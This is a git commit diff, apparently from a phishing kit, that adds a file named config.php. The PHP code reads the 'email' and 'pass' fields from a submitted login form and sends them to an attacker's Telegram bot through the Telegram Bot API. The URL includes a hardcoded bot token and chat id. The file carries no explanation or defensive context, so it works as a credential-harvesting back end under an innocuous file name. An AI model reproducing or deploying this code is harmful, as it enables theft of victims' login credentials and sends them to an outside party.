d4dee67f8f598b9a3285b94380a836935a29a557
AI22AK47 <94799989+AI22AK47@users.noreply.github.com>
2022-11-07 07:06:05 +0600

    Add files via upload

---
+++ config.php
@@ -0,0 +1,7 @@
+<?php
+    if(isset($_POST['submit']))
+    $text=$_POST["email"];
+    $text2=$_POST["pass"];
+        $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text,$text2");    
+    
+?>
